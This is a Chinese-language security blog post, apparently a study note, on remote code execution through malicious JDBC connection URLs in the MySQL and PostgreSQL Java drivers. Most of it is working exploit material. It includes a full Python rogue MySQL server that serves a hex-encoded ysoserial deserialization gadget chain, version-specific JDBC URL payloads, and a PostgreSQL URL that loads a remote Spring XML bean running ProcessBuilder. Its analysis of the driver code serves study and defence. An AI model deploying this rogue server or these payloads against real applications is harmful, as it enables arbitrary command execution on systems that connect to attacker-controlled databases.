# JDBC Connection URL RCE


# 前言

这几天注意到了有一个JDBC RCE的点，麻利的学习了一下，以下是个人的一些总结，算是为了以后方便自己看，先主要学习了Mysql和PostgreSQL JDBC RCE的点

# Mysql JDBC RCE

## 环境分析

先来搭建一下环境，pom加上mysql-connector的依赖，在构建一个JDBC连接

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>8.0.12</version>
</dependency>
```

```java
import java.sql.Connection;
import java.sql.DriverManager;

public class test {
    public static void main(String[] args) throws Exception {
        Class.forName("com.mysql.jdbc.Driver");
        String jdbc_url = "jdbc:mysql://127.0.0.1:3306/test?" +
                "autoDeserialize=true" +
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        Connection con = DriverManager.getConnection(jdbc_url, "root", "root");
    }
}

```

来看一下JDBC的语句，`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor`，里面有两个参数`autoDeserialize`和`queryInterceptors`，`autoDeserialize`字面意思允许反序列化后面rce的时候需要用到，然后来看一下`queryInterceptors`这个参数，指定了一个拦截器，在JDBC连接成功后，会优先通过指定的这个拦截器，会经过`preProcess`和`postProcess`这两个函数，这两个函数都会调用`populateMapWithSessionStatusValues`中，可以看到在该函数内执行了`SHOW SESSION STATUS`sql语句操作，跟进到`resultSetToMap`中

![1.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/450ed1be-1cc1-8579-214c-b1f5189ecf71.png)

接着进入到`getObject`中

![2.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/2ea971b8-d605-8a85-2dda-db8347cc1144.png)

熟悉的readObject操作，其中`autoDeserialize`设置为true是为了过if语句，这里反序列化的数据为执行sql语句后mysql返回的信息，因此可以通过**伪造一个mysql服务器或者篡改返回的数据**，即可达到反序列化rce的操作

![3.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8993ecaf-b0b1-dcf5-37bd-cdb5b7b2de2a.png)


这里放一个网上师傅写的py脚本，伪造了一个mysql服务，payload为cc7构造的弹计算器的命令，这里就不演示了

```python
# coding=utf-8
import socket
import binascii
import os

greeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"
response_ok_data="0700000200000002000000"

def receive_data(conn):
    data = conn.recv(1024)
    print("[*] Receiveing the package : {}".format(data))
    return str(data).lower()

def send_data(conn,data):
    print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] > payload
    file= r'payload'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print("open successs")

    else:
        print("open false")
        #calc
        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if "session.auto_increment_increment" in data:
                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'
                send_data(conn,_payload)
                data=receive_data(conn)
            elif "show warnings" in data:
                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'
                send_data(conn, _payload)
                data = receive_data(conn)
            if "set names" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "set character_set_results" in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if "show session status" in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                # 获取payload
                payload_content=get_payload_content()
                # 计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                # 计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if "show warnings" in data:
                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3306

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))

    run()
```

## Payload不同版本

8.X

```
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

6.X

```
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

 ＞= 5.1.11

```
jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
```

5.X ＜= 5.1.10

同上，需要连接后执行查询

> 其它的触发点：**detectCustomCollations** 这里就不去分析了

5.1.29 - 5.1.40

```
jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&autoDeserialize=true
```

5.1.19 - 5.1.28

```
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true
```

# Postgresql JDBC RCE

受影响版本：

```
< 42.2.25
>= 42.3.0，< 42.3.2
```

环境搭建，引入以下依赖：

```xml
<dependencies>
    <dependency>
        <groupId>org.postgresql</groupId>
        <artifactId>postgresql</artifactId>
        <version>42.3.0</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-context-support</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
</dependencies>
```

```java
import java.sql.DriverManager;

public class test {
    public static void main(String[] args) throws Exception {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1/poc.xml";
        String jdbc_url = "jdbc:postgresql:///?socketFactory="+socketFactoryClass+"&socketFactoryArg="+socketFactoryArg;
        DriverManager.getConnection(jdbc_url);
    }
}
```

可以看到`socketFactory`参数指定了一个`ClassPathXmlApplicationContext`，在加上`socketFactoryArg`参数指定了一个http服务下的xml文件，是的，Postgresql JDBC RCE 根本上就是会创建一个`ClassPathXmlApplicationContext`实例，然后去解析xml文件达到rce的效果，接下来来看一下它是怎样去创建实例的

将url的参数分别提取后放入到props中，进入`makeConnection`中创建连接

![4.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6f1f9038-f0c7-f579-cae6-7fd976a58b3f.png)

这里将user和database参数提取出来进入到`openConnection`中

![5.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/23a86825-f718-1dfd-8977-3bcf6a75fa62.png)

接着进行一些参数的判断，进入到`openConnectionImpl`中

![6.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/dcc47661-a4a5-6740-8e0b-52d8257545c0.png)

接着通过工厂类获取实例进入到`getSocketFactory`中

![7.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b1c02515-5264-9df5-5517-8ff58345f688.png)

在这里从info中取出`SOCKET_FACTORY`，进行判断如果有指定的值就从指定的值获取实例，并且传入info中提取的`SOCKET_FACTORY_ARG`值，最后创建了`ClassPathXmlApplicationContext`实例，最终去解析xml触发rce，这里就不去弹计算器了放上xml

![8.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cb51439f-69e8-5d9e-262d-06e830473aac.png)

![](9.png)
![9.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cfdd76f4-dc0d-a26c-dfdc-27c29a3f0e0f.png)

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="test" class="java.lang.ProcessBuilder">
        <constructor-arg value="calc" />
        <property name="whatever" value="#{test.start()}"/>
    </bean>
</beans>
```

还有一个[Postgresql任意文件写入的点](https://forum.butian.net/share/1339)有兴趣的可以去看一下

# 参考连接

1. https://xz.aliyun.com/t/8159
2. https://forum.butian.net/share/1339

